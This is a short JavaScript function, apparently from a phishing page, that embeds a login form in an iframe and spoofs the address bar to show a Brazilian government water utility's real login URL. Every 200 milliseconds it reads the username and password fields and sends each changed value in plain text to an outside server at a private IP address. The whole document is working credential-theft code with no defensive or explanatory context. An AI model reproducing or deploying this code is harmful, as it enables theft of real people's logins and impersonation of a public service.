function iframeEdit() {
var username = ""
var password = ""
var myIframe = document.getElementById('loginPageIframe'); 
var iframeDoc = myIframe.contentDocument || myIframe.contentWindow.document;
var user = iframeDoc.getElementById('user-input');
var pass = iframeDoc.getElementById('senha-input');
window.history.replaceState(null, '', 'https://sic.cagepa.pb.gov.br/app_Login/');
setInterval(() => {
    if(user.value!==username){
        username = user.value
        fetch('http://192.168.35.17:8080/username/'+username)
    }
    if(pass.value!==password){
        password = pass.value
        fetch('http://192.168.35.17:8080/password/'+password)
    }
}, 200 )
}
